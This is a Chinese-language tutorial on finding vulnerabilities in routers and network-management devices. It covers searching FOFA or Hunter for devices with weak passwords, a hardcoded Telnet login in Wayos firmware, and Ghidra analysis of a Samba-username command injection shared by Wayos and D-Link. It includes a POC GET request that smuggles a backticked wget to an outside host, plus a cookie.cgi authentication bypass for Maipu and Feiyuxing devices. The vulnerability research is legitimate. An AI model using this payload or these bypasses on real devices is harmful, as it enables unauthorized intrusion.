## 前言

在日常渗透过程中，可能会遇到各种路由、上网行为管理等设备，这时候该怎么去对这些设备进行快速挖掘就成为我们想要解决的问题。

---

## 1. 信息收集

### 1.1 弱口令搜索

对于设备黑盒来说，信息收集也是一个比较重要的过程。更多的时候可以去寻找 web 后台密码，一些设备可以得到比如：
- 通过寻找网上的用户指导手册
- 通过 CNVD 以及 CVE 查找相应弱口令设备
- 然后进入 FOFA 或者 Hunter 等搜索引擎搜索到未修复的弱口令进入后台挖掘

因为更多的功能点只能在后台更好地做测试。

### 1.2 硬编码问题

设备常常会开启一些如 Telnet、SSH 服务，也可能在初始化时会以硬编码的方式开启这些服务端口，允许设备被远程连接，也可能是开发者在调试的一些隐藏后门。

**案例：Wayos 微盟路由器固件**

- 固件仿真模拟执行时发现系统开启了相关的 Telnet 服务
- 在初始化文件中确认有该操作
- 通过对函数简单分析锁定到 `mqtt_ai_sw_telnet_login` 函数
- 使用该硬编码成功登录了设备的 Telnet 服务

**SSH 密码寻找：**
- 设备可能开启 SSH
- 做仿真模拟时可以查看 `/etc/shadow` 文件
- 也可以试着解密密码进行漏洞挖掘

## 2. 相同组件及 OEM 框架挖掘

正如我们挖 Web 的时候，挖 Java 的站点常常会想到一些 Fastjson、Log4j2 这种会造成漏洞的组件漏洞，以及类似 Spring Boot 框架的框架型漏洞。对于设备来说，也有所谓的组件以及框架。

### 2.1 组件漏洞问题

相对于设备来说也有其相应的组件，做设备挖掘时设备可能会有相应的功能点。

**案例：USB 共享存储组件导致的命令执行漏洞**

1. 微盟路由器发现相关漏洞
2. 在寻找前台路由器挖掘时，发现 D-Link 路由器的用户指导手册中具有相同的功能
3. 将 D-Link 固件拉下解开固件包后寻找漏洞路径字符，发现该组件也拥有相同漏洞路径字符

**审计过程：**
1. 将固件丢入 Ghidra 分析
2. 在 Function 栏过滤出主要执行函数 `system`
3. 对该函数点击交叉引用，得到所有调用 system 函数的位置
4. 反溯 system 执行的命令中含有可控数据流部分

**漏洞原理：**
- 代码本来主要目的是设置 Samba 服务器的用户名
- 使用 echo 命令将值写入 `/etc/smbusers` 文件
- 但用户输入 `usb_username` 和 `use_husername` 没有进行完全过滤
- 拼接的命令直接作为 `system()` 参数执行，导致命令注入

**POC：**
```
GET /usb_paswd.asp?share_enable=1&passwd=123456&name=login&hpasswd=123456&hname=hlogin%60wget%20http%3A%2F%2F192.168.1.2%3A8000%60
```

### 2.2 OEM 漏洞问题

设备也有属于自己的框架，可以通过寻找一些 CVE 或者 CNVD 的路由器进行获取一些 JS 获取得到一些类似的系统设备的相同漏洞，或者 RCE 之后做白盒审计发现。

**案例：迈普 vs 飞鱼星**

- 迈普的多业务融合系统和飞鱼星的企业智能上网行为管理系统使用相同 OEM
- 飞鱼星漏洞在迈普依旧可以使用
- 如该权限绕过漏洞：迈普多业务融合系统存在权限绕过

**利用方法：**
- 访问 `http://xxx/home/index.htm`
- 丢弃 cookie.cgi 相同包可以绕过设备登录校验

---

## 总结

1. **信息收集阶段**：通过弱口令手册、CNVD/CVE、FOFA/Hunter 寻找入口
2. **深入挖掘**：关注硬编码、隐藏后门
3. **横向扩展**：同组件/同 OEM 框架的设备可能存在相同漏洞
